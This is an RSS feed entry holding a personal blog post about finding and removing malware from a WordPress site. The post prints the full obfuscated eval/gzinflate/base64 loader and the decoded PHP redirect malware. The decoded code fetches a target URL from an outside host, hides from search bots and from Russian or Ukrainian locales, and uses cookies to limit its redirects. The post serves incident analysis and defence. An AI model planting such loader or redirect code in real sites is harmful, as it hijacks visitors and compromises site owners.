+<p>I continued with browsing through the SQL dump, looking for suspicious content, and I was shocked to see how much serialized PHP there is in a usual Wordpress database.  However, none of this was malicious, just plugin data.  I did the same for the <code>.php</code> files but there were just too many of them and I couldn't find anything malicious in there as well.  In hindsight I should have searched for high-entropy strings with a tool like <a href="https://github.com/trufflesecurity/truffleHog">truffleHog</a>.</p>
+<p>I was running out of ideas, and so I decided to remove things until the redirect didn't occur anymore.  In the database I began deleting tables, each time checking for the redirect.  Eventually, I ended up with a mostly empty database where I also deleted most of <code>wp_options</code> but the redirect still happened.  We can rule out the database now, that's for sure.</p>
+<p>The next thing I did was to download a new Wordpress archive and replace the existing files with it.  As you can already imagine, it didn't fix the issue, but this also meant that Wordpress itself was not the culprit.</p>
+<p>What we're left with are the plugins, which was surprising to me since I deactivated them already and still saw the redirect happening.  Let's take the sledgehammer and crush down all the plugins, or deleting them one-by-one to say it in a more cultivated manner.  It was the last plugin I looked at, of course, that contained the malware.</p>
+<h3>The Malware</h3>
+<p>Below are the contents of <code>/wp-content/mu-plugins/index.php</code>, making no secret of their malicious nature.</p>
+<pre><code class="language-php">&lt;?php 
+
+/**
+ * arbitrary bother focus glorious household invade pursue triangle vertical.
+ * acid bundle conservation guilty recreation simplify vacuum.
+ * alcohol attitude comedy decline defect delay delicate enviroment exclaim explosive geography harmony junior manufacture navigation neglect recreation remote ridge ridid simplify volcano.
+ * adequate aware debate estimate excursion herd illusion jewel nylon passion route ruin shrug sophisticated submerge vain vivid.
+ * applause isolate nuclear optimistic transmit virus.
+ * @package WordPress
+ */
+
+eval (gzinflate(base64_decode(
+'xRnbbttG9jkB8g+0oAUpVLJsZ3fbxnVcRaYTt75VF7eFYRBjcmxNRXLYmZEsOwiw'
+.'uw/7RwssCux+g/NHPWdISiRFSknQiyAfcW7nfht6/+VX+9EoevaUCsGFI2jEhWLh'
+.'rbXV2H329GsWMkdSZZkjFfiO3iPNprll5lc9JiOf3K/fIBURahJVb/T5bXHx2dOb'
+.'SegqxkPD5XzMqNV49vQtzhvwqQeAdiJ8Y88AJlUkX7Tb1yBA65qrTZcHbUG9TTVT'
+.'5m6y3x3BVhdOOEBUWfPzjWSDXgJeeASL7qhpdIe947PzgdOzB8Pe6aDXOe0f2r2m'
+.'ocSErj3U7x87F3bv6PDHcxsP3RBfrj/1xu4cLO2uow1S3umMungmh8r1uaTZ2XpI'
+.'7xLlxMd352q73xnDbDBWLKDWVtOIv9v6u7P1fCdFwW4MiwaRurfqTvfs7Nsj+9KU'
+.'vhNQKcktNa8aDeNtvBM/IExio+ympmESL2AhPCBdGLbNFD9+RpR4VFjmMXcJ2vmF'
+.'YRqbc+Ybu4YHCGtOLT3zzqCglyzdUi6r2Syy+hG8fgq/mudU8/Cgn12fSGmAdzKh'
+.'3flJvDwlwqj7JLydADe7mTlBb6igAoxWq2XnY/MuzUGo8QgWiBDk3qrdRS0ILRZu'
+.'QrDXmkbt8ZfH/z/+7/E/7/9tvP/n+3+9/wcMf3n875zlORsFPGKCpyckv1FLQccK'
+.'9mFUZJf4GDCI7AwidLQ0BLkUC+R7kin6l+cdJLEJlBpzd51nAMdxeQiHJq7CNJAo'
+.'LWPauhox2XpJPE9zjgSsrB2S9VuqYh6qFkGFVUuolrI1RSUijVVhLZifmz4SbEoU'
+.'XUhTODEX5smTvGsnBJh0IKtZy76crGfMoDNHwW0FVRMR5n2ygpJmTOsvFvY3pLiG'
+.'HtgrdY4/kiyaO5nEEP7dCG8kiEDMiEsHHD8lGwdKc0FJh/vHcNJuf4i1222IQseb'
+.'BFFW4N1lV/hgVj9SYQWODJ3M157O5JWC61aH1yJYyzIFymjVfSYRPcijuM/vICHU'
+.'nb7dg5p9ab4ZDM6dTrdrQ0k+7py+HnZe21hKloRFVJGgt05AlDtyiO9bZtu6JK2H'
+.'q7fbzS/eWfsvWotRY78BE7s/71mXW60vN68+azT221hvkJfkZ5lGRi1peUgzJ+TE'
+.'AHoeGktzuX2VILncuSqWLp1MuaAE2iCriI5IKGLG3kujPm0sHyth4LIeXgET9amx'
+.'j+CFsV1CjggJPWWRWNPon/UGzunwBLqjbpHNdxlLx8W+QvR5Hl6TZDO5bMkRyvQR'
+.'lz1UyLTU2rHexxR63hloWlr1abPIY7kN47gs+nNR6MVjsj8fPR8ibS6TZgOgNBUu'
+.'R3mxTq9PTeWi5XLgJ0ujEzRmmrJQLlpw3v9UGzBbAWjoadxN3Py7Gu1JhZxZ7QNo'
+.'Ypck1ogK+1bIF2O0lGCBlU1uiLfRzOU7lHljL0nQf5rPaiPEbiYpEXCJKc3YcnKN'
+.'LV28E4BPw1goo7UYxucbBgiVDj7YVytkWF9pknaylGsm8XZbqCw9G+6Rdq/scpKP'
+.'tIr6VMtiqV01luVYzbBucasa6PhaUVoWe/Z3Q7s/cIa9I/Nqff5Nu9ZSxWykt7ac'
+.'ZoYwcqDYng5KlZPU7LgALHurOR33R0Tou9xrzm99/XTxLQ8VGSs9OCQuvYbbnz1T'
+.'VITEf8OU2SzB9CMJPTp7xRUeigcd14WrIrtmPlP3uZUTDpM0N3UA7YurDu7DFdj7'
+.'rqA0lCOuckePAighcjG+YB7lheE51FYqVuA+gQaKLA69gjtgBuUhmTK8Ti1mvqfX'
+.'AZFqJc5z4MsdUXeMu3Lc9qhkD9nZjndKl7RRgTpePIRb+SiLoksgpD2SmenDJdFn'
+.'4TjD9gmFPDcmK5g+pXeZ/TgqoOgSRUA7Gd5DxaZMTOQq9RIxzgp4QYViWQVzccAD'
+.'ot8mpNxHgky1oasdQmes/ohHWQnBkCHJechZqPjBq+K4c35UijuOhOsYwXzQ0obD'
+.'KU0hIkKFVMjWIm46ngSq84kSzCeE+Zu9oZMwh2/fEjIQK5yH2gEZcVAqNo2N25Fj'
+.'4xtKp7RcvWdByOxZ5EOxEyne7593nQviM48ornGAs3Z8lbj3iPNDSr0+pXO/hKmN'
+.'Uuz2A+eBNhP+DfgEy4YiCdMn32zvpPyPIAPLhH5slnQATthXRFW4xym7DcimmODW'
+.'V4R5ExlBvGq+8JRM8PeP+oPe0Q+xqkBTCfIbFnqJe5bgjgSfsYC5uPMsoiGL3SrF'
+.'LwG/x4OEuD1LxVrs6NOHkARVPsgTJrqtgZEcHUYevwO3SDGFnEf3+ASRyiDyZlrf'
+.'VLFShHEEXJCE+kH3PMFzTiIqjhnSyx9r5G6J+a5H535sewAJSFHeryQNEMMOaEVp'
+.'aWawrG6AVjdBhc5huS/6xK4i/xKrqlLHt/GKemj+jJq+Q6CjWZtAa18bUPsIQ6BL'
+.'i044OqB0dHjaGRHovDhC8BOCMQIfwQMCbX/tj1OdABDolBcg2Eawg+A5gr8i+BuC'
+.'vyP4HMEXCL5EsGU2zYf7KZ9lXCLXYmjwEa976/z6J9BNSO/id62Z93L6GgDLmfcM'
+.'kEeNdEq3Xht7tVrOI9J/Qezm3+buv/xq/1c='
+)));
+?&gt;
+</code></pre>
+<p>No wonder I didn't get any results in my search since they <a href="https://en.wikipedia.org/wiki/Deflate">deflated</a> the base64 encoded strings.  Never before have I seen such a malware in the wild so I was very curious to find out what was hiding in it.  There's a very handy tool for such tasks called <a href="https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Raw_Inflate(0,0,'Adaptive',false,false)&amp;input=eFJuYmJ0dEc5amtCOGcrMG9BVXBWTEpzWjNmYnhuVmNSYVlUdDc1VkY3ZUZZUkJqY214TlJYTFltWkVzT3dpdwp1dy83Undzc0N1eCtnL05IUFdkSVNpUkZTa25RaXlBZmNXN25maHQ2LytWWCs5RW9ldmFVQ3NHRkkyakVoV0xoCnJiWFYySDMyOUdzV01rZFNaWmtqRmZpTzNpUE5wcmxsNWxjOUppT2YzSy9mSUJVUmFoSlZiL1Q1YlhIeDJkT2IKU2VncXhrUEQ1WHpNcU5WNDl2UXR6aHZ3cVFlQWRpSjhZODhBSmxVa1g3VGIxeUJBNjVxclRaY0hiVUc5VFRWVAo1bTZ5M3gzQlZoZE9PRUJVV2ZQempXU0RYZ0plZUFTTDdxaHBkSWU5NDdQemdkT3pCOFBlNmFEWE9lMGYycjJtCm9jU0VyajNVN3g4N0YzYnY2UERIY3hzUDNSQmZyai8xeHU0Y0xPMnVvdzFTM3VtTXVuZ21oOHIxdWFUWjJYcEkKN3hMbHhNZDM1MnE3M3huRGJEQldMS0RXVnRPSXY5djZ1N1AxZkNkRndXNE1pd2FSdXJmcVR2ZnM3TnNqKzlLVQp2aE5RS2NrdE5hOGFEZU50dkJNL0lFeGlvK3ltcG1FU0wyQWhQQ0JkR0xiTkZEOStScFI0VkZqbU1YY0oydm1GCllScWJjK1lidTRZSENHdE9MVDN6enFDZ2x5emRVaTZyMlN5eStoRzhmZ3EvbXVkVTgvQ2duMTJmU0dtQWR6S2gKM2ZsSnZEd2x3cWo3Skx5ZEFEZTdtVGxCYjZpZ0FveFdxMlhuWS9NdXpVR284UWdXaUJEazNxcmRSUzBJTFJadQpRckRYbWtidDhaZkgvei8rNy9FLzcvOXR2UC9uKzMrOS93Y01mM244NzV6bE9Sc0ZQR0tDcHlja3YxRkxRY2NLCjltRlVaSmY0R0RDSTdBd2lkTFEwQkxrVUMrUjdraW42bCtjZEpMRUpsQnB6ZDUxbkFNZHhlUWlISnE3Q05KQW8KTFdQYXVob3gyWHBKUEU5empnU3NyQjJTOVZ1cVloNnFGa0dGVlV1b2xySTFSU1VpalZWaExaaWZtejRTYkVvVQpYVWhUT0RFWDVzbVR2R3NuQkpoMElLdFp5NzZjckdmTW9ETkh3VzBGVlJNUjVuMnlncEptVE9zdkZ2WTNwTGlHCkh0Z3JkWTQva2l5YU81bkVFUDdkQ0c4a2lFRE1pRXNISEQ4bEd3ZEtjMEZKaC92SGNOSnVmNGkxMjIySVFzZWIKQkZGVzROMWxWL2hnVmo5U1lRV09ESjNNMTU3TzVKV0M2MWFIMXlKWXl6SUZ5bWpWZlNZUlBjaWp1TS92SUNIVQpuYjdkZzVwOWFiNFpETTZkVHJkclEways3cHkrSG5aZTIxaEtsb1JGVkpHZ3QwNUFsRHR5aU85Ylp0dTZKSzJICnE3ZmJ6Uy9lV2ZzdldvdFJZNzhCRTdzLzcxbVhXNjB2TjY4K2F6VDIyMWh2a0pma1o1bEdSaTFwZVVnekorVEUKQUhvZUdrdHp1WDJWSUxuY3VTcVdMcDFNdWFBRTJpQ3JpSTVJS0dMRzNrdWpQbTBzSHl0aDRMSWVYZ0VUOWFteApqK0NGc1YxQ2pnZ0pQV1dSV05Qb24vVUd6dW53QkxxamJwSE5keGxMeDhXK1F2UjVIbDZUWkRPNWJNa1J5dlFSCmx6MVV5TFRVMnJIZXh4UjYzaGxvV2xyMWFiUElZN2tONDdncytuTlI2TVZqc2o4ZlBSOGliUzZUWmdPZ05CVXUKUjNteFRxOVBUZVdpNVhMZ0owdWpFelJtbXJKUUxscHczdjlVR3pCYkFXam9hZHhOM1B5N0d1MUpoWnhaN1FObwpZcGNrMW9nSysxYklGMk8wbEdDQmxVMXVpTGZSek9VN2xIbGpMMG5RZjVyUGFpUEViaVlwRVhDSktjM1ljbktOCkxWMjhFNEJQdzFnb283VVl4dWNiQmdpVkRqN1lWeXRrV0Y5cGtuYXlsR3NtOFhaYnFDdzlHKzZSZHEvc2NwS1AKdElyNlZNdGlxVjAxbHVWWXpiQnVjYXNhNlBoYVVWb1dlL1ozUTdzL2NJYTlJL05xZmY1TnU5WlN4V3lrdDdhYwpab1l3Y3FEWW5nNUtsWlBVN0xnQUxIdXJPUjMzUjBUb3U5eHJ6bTk5L1hUeExROFZHU3M5T0NRdXZZYmJuejFUClZJVEVmOE9VMlN6QjlDTUpQVHA3eFJVZWlnY2QxNFdySXJ0bVBsUDN1WlVURHBNME4zVUE3WXVyRHU3REZkajcKcnFBMGxDT3Vja2VQQWlnaGNqRytZQjdsaGVFNTFGWXFWdUErZ1FhS0xBNjlnanRnQnVVaG1USzhUaTFtdnFmWApBWkZxSmM1ejRNc2RVWGVNdTNMYzlxaGtEOW5aam5kS2w3UlJnVHBlUElSYitTaUxva3NncEQyU21lbkRKZEZuCjRUakQ5Z21GUERjbUs1ZytwWGVaL1RncW9PZ1NSVUE3R2Q1RHhhWk1UT1FxOVJJeHpncDRRWVZpV1FWemNjQUQKb3Q4bXBOeEhna3kxb2FzZFFtZXMvb2hIV1FuQmtDSEplY2hacVBqQnErSzRjMzVVaWp1T2hPc1l3WHpRMG9iRApLVTBoSWtLRlZNaldJbTQ2bmdTcTg0a1N6Q2VFK1p1OW9aTXdoMi9mRWpJUUs1eUgyZ0VaY1ZBcU5vMk4yNUZqCjR4dEtwN1JjdldkQnlPeFo1RU94RXluZTc1OTNuUXZpTTQ4b3JuR0FzM1o4bGJqM2lQTkRTcjArcFhPL2hLbU4KVXV6MkErZUJOaFArRGZnRXk0WWlDZE1uMzJ6dnBQeVBJQVBMaEg1c2xuUUFUdGhYUkZXNHh5bTdEY2ltbU9EVwpWNFI1RXhsQnZHcSs4SlJNOFBlUCtvUGUwUSt4cWtCVENmSWJGbnFKZTViZ2pnU2ZzWUM1dVBNc29pR0wzU3JGCkx3Ry94NE9FdUQxTHhWcnM2Tk9Ia0FSVlBzZ1RKcnF0Z1pFY0hVWWV2d08zU0RHRm5FZjMrQVNSeWlEeVpscmYKVkxGU2hIRUVYSkNFK2tIM1BNRnpUaUlxamhuU3l4OXI1RzZKK2E1SDUzNXNld0FKU0ZIZXJ5UU5FTU1PYUVWcAphV2F3ckc2QVZqZEJoYzVodVMvNnhLNGkveEtycWxMSHQvR0tlbWorakpxK1E2Q2pXWnRBYTE4YlVQc0lRNkJMCmkwNDRPcUIwZEhqYUdSSG92RGhDOEJPQ01RSWZ3UU1DYlgvdGoxT2RBQkRvbEJjZzJFYXdnK0E1Z3I4aStCdUMKdnlQNEhNRVhDTDVFc0dVMnpZZjdLWjlsWENMWFltandFYTk3Ni96Nko5Qk5TTy9pZDYyWjkzTDZHZ0RMbWZjTQprRWVOZEVxM1hodDd0VnJPSTlKL1Flem0zK2J1di94cS8xYz0">CyberChef</a>.</p>
+<p>Finally, after a couple of wasted hours, we could get rid of the malware by deleting the <code>index.php</code>.  I also made sure that everything is up-to-date and reset all passwords.  At least I thought at that moment that the website was clean.  A few days later the malware reappeared 😕.</p>
+<p>The malware installed itself inside <code>/wp-content/mu-plugins/</code> which is the plugin directory of <a href="https://github.com/WordPress/health-check">Health Check</a>, an official Wordpress plugin<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.  Removing this folder fixed the issue and the malware did not came back, phew.</p>
+<p>Also, we got an insight in the malware that seems to be of Russian or Ukrainian origin, because requesting with an <code>UA</code> or <code>RU</code> locale (<code>-H 'Accept-Language: ua</code>) disabled the malware!</p>
+<pre><code class="language-php"> ?&gt;&lt;?php
+error_reporting(0);
+@ini_set('html_errors','0');
+@ini_set('display_errors','0');
+@ini_set('display_startup_errors','0');
+@ini_set('log_errors','0');
+
+function cookie()
+{
+
+    $may_url = 'https://bing-bot.com/red.txt';
+    $ch = curl_init($may_url );
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_HEADER, false);
+    $html = curl_exec($ch);
+    curl_close($ch);
+    $new_url =  $html;
+
+    $y2k = mktime(0, 0, 0, 1, 1, 2032);
+    if (empty($_COOKIE['sl_message'])) {
+        setcookie('sl_message', 'admin', $y2k, '/');
+        header('Location: ' . $new_url); die(&quot;_&quot;);
+    } else {
+        if (empty($_COOKIE['ssl_message'])) {
+            setcookie('ssl_message', 'admin', $y2k, '/');
+            header('Location: ' . $new_url); die(&quot;_&quot;);
+        }
+
+    }
+}
+
+class redir
+{
+	
+    var $language;
+    var $referer = &quot;&quot;;
+    var $url = &quot;&quot;;
+    var $url_stop = array(&quot;wp-login.php&quot;, &quot;конец строки&quot;);
+    var $lang_stop = array(&quot;ru&quot;, &quot;ua&quot;);
+    var $redirekt = true;
+    var $ok_str;
+    var $stop_referal_str = array(&quot;=site%3A&quot;, &quot;.ru&quot;);
+
+    function __construct()
+	
+    {
+        $this-&gt;add_stop_str();
+        $this-&gt;get_refer();
+        $this-&gt;get_url();
+        $this-&gt;get_lang();
+        $this-&gt;test_redirekt();
+
+    }
+
+    private function test_redirekt()
+    {
+		
+        if ($this-&gt;is_bot()) {
+            $this-&gt;redirekt = false;
+            return;
+        }
+		
+        if ($this-&gt;test_stop_lang()) {
+            $this-&gt;redirekt = false;
+            return;
+        }
+
+        if ($this-&gt;test_stop_str_referal()) {
+            $this-&gt;redirekt = false;
+            return;
+        }
+
+        if ($this-&gt;test_stop_url($this-&gt;url)) {
+            $this-&gt;redirekt = false;
+            return;
+        }
+
+        if (!$this-&gt;strpos_arr($this-&gt;ok_str, $this-&gt;referer)) {
+            $this-&gt;redirekt = false;
+//            return;
+        }
+		
+//var_dump($this-&gt;url);
+		
+        if (!$this-&gt;strpos_arr($this-&gt;ok_str, $this-&gt;url)) {
+            $this-&gt;redirekt = false;
+
+        }
+		  else{
+            $this-&gt;redirekt = true;
+        }
+		
+    }
+
+    private function get_lang()
+	
+    {
+        if (($list = strtolower($_SERVER['HTTP_ACCEPT_LANGUAGE']))) {
+            if (preg_match_all('/([a-z]{1,8}(?:-[a-z]{1,8})?)(?:;q=([0-9.]+))?/', $list, $list)) {
+                $this-&gt;language = array_combine($list[1], $list[2]);
+                foreach ($this-&gt;language as $n =&gt; $v)
+                    $this-&gt;language[$n] = $v ? $v : 1;
+                arsort($this-&gt;language, SORT_NUMERIC);
+            }
+        } else $this-&gt;language = array();
+    }
+
+    private function test_stop_lang()
+    {
+        foreach ($this-&gt;lang_stop as $v) {
+            if (array_key_exists($v, $this-&gt;language)) {
+                return true;
+            }
+        }
+        return false;
+
+    }
+
+    private function test_stop_str_referal()
+	
+    {
+
+        if ($this-&gt;strpos_arr($this-&gt;stop_referal_str, $this-&gt;referer)) {
+            return true;
+        }
+
+        return false;
+
+    }
+
+    private function test_stop_url($url)
+	
+    {
+        foreach ($this-&gt;url_stop as $v) {
+            if ($this-&gt;test_end($url, $v)) {
+                return true;
+            }
+        }
+        return false;
+
+    }
+	
+    private function strpos_arr($arr, $str)
+	
+    {
+        foreach ($arr as $v) {
+            if (strpos(trim(strtolower($str)), strtolower($v)) !== false) {
+                return true;
+            }
+        }
+        return false;
+
+    }
+
+    private function test_end($str, $search)
+    {
+        if (substr($str, strlen($str) - strlen($search)) == $search) {
+            return true;
+        }
+        return false;
+    }
+
+    private function get_refer()
+    {
+        if (isset($_SERVER['HTTP_REFERER'])) {
+            $this-&gt;referer = strtolower($_SERVER[&quot;HTTP_REFERER&quot;]);
+        }
+    }
+
+    private function get_url()
+    {
+        $this-&gt;url = strtolower($_SERVER['REQUEST_URI']);
+    }
+
+    private function is_bot()
+    {
+        if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+            $list = array(
+                'vkShare', 'Google', 'VKontakte', 'FacebookExternalHit',
+                'YandexBot', 'YandexAccessibilityBot', 'YandexMobileBot', 'YandexDirectDyn',
+                'YandexScreenshotBot', 'YandexImages', 'YandexVideo', 'YandexVideoParser',
+                'YandexMedia', 'YandexBlogs', 'YandexFavicons', 'YandexWebmaster',
+                'YandexPagechecker', 'YandexImageResizer', 'YandexAdNet', 'YandexDirect',
+                'YaDirectFetcher', 'YandexCalendar', 'YandexSitelinks', 'YandexMetrika',
+                'YandexNews', 'YandexNewslinks', 'YandexCatalog', 'YandexAntivirus',
+                'YandexMarket', 'YandexVertis', 'YandexForDomain', 'YandexSpravBot',
+                'YandexSearchShop', 'YandexMedianaBot', 'YandexOntoDB', 'YandexOntoDBAPI',
+                'Googlebot', 'Googlebot-Image', 'Mediapartners-Google', 'AdsBot-Google',
+                'Mail.RU_Bot', 'bingbot', 'Accoona', 'ia_archiver', 'Ask Jeeves',
+                'OmniExplorer_Bot', 'W3C_Validator', 'WebAlta', 'YahooFeedSeeker', 'Yahoo!',
+                'Ezooms', '', 'Tourlentabot', 'MJ12bot', 'AhrefsBot', 'SearchBot', 'SiteStatus',
+                'Nigma.ru', 'Baiduspider', 'Statsbot', 'SISTRIX', 'AcoonBot', 'findlinks',
+                'proximic', 'OpenindexSpider', 'statdom.ru', 'Exabot', 'Spider', 'SeznamBot',
+                'oBot', 'C-T bot', 'Updownerbot', 'Snoopy', 'heritrix', 'Yeti',
+                'DomainVader', 'DCPbot', 'PaperLiBot'
+            );
+
+            foreach ($list as $botname) {
+                if (stripos($_SERVER['HTTP_USER_AGENT'], $botname) !== false) {
+                    return true;
+                }
+            }
+        }
+
+        return false;
+    }
+
+    private function add_stop_str()
+    {
+        $this-&gt;ok_str = array(
+            'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', 'z', 'x', 'c', 'v', 'b', 'n', 'm', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0','zyvox'
+        );
+    }
+
+}
+
+if (empty($_COOKIE['ssl_message'])) {
+    $obj = new redir();
+
+    if ($obj-&gt;redirekt and $obj-&gt;referer!=&quot;&quot;) {
+        cookie();
+    }
+}
+
+?&gt;&lt;?
+</code></pre>
+<h3>Summary</h3>
+<p>This incident just undermined my presumption that Wordpress is inherently insecure and is not a good choice for small business and personal websites.  Owning a Wordpress based website makes you a system administrator, if you like it or not.  Building websites is not my profession, so I can't give any recommendations based on personal experience.  If someone would ask me to build them a website for their small business I would reach for some Jamstack solution, like Netlify which provides a CMS but renders out static files.</p>
+<p>Searching for the terms <code>wordpress remove malware</code> is no help at all.  Most of the results are just scam or they advertise shady &quot;malware scanner&quot; plugins that at best do nothing and <em>only</em> cost you money.</p>
+<section class="footnotes" role="doc-endnotes">
+<hr>
+<ol>
+<li id="fn:1" role="doc-endnote">
+<p>I don't care about your opinion on cryptocurrencies.  It's a waste of energy and thanks to this 💩 technology we now see <del>people</del> idiots promoting web3 as being all the rage.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:2" role="doc-endnote">
+<p>There is an incredibly handy tool called <a href="https://gchq.github.io/CyberChef/">CyberChef</a> for applying chains of encodings and decodings to an input string.&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+<li id="fn:3" role="doc-endnote">
+<p>I need to file a GitHub issue so they can look for the actual security vulnerability.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
+</li>
+</ol>
+</section>
+
+
+      </main>
+    </div>
+  </div>
+</body>
+
+</html>
+]]></content:encoded>
+      <author>Andreas Linz</author>
+      <pubDate>Sat, 09 Apr 2022 12:38:35 +0000</pubDate>
     </item>
   </channel>
 </rss>
